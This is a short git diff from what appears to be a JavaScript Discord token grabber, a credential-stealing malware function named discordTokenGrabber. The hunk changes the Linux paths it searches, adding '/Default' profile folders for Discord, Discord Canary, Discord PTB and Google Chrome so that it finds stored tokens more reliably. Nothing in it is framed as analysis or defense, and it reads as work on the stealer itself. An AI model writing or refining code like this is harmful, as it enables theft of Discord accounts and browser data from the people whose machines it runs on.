@@ -143,10 +143,10 @@ function discordTokenGrabber() {
         const home = path.join(process.env.HOME, '.config/');
 
         paths = {
-            Discord: path.join(home, 'discord'),
-            'Discord Canary': path.join(home + 'discordcanary'),
-            'Discord PTB': path.join(home + 'discordptb'),
-            'Google Chrome': path.join(home + 'google-chrome'),
+            'Discord': path.join(home, 'discord'),
+            'Discord Canary': path.join(home + 'discordcanary' + '/Default'),
+            'Discord PTB': path.join(home + 'discordptb' + '/Default'),
+            'Google Chrome': path.join(home + 'google-chrome' + '/Default'),
             'Chromium': path.join(home + 'chromium' + '/Default')
         };
     } else if (computerPlatform == 'darwin') {
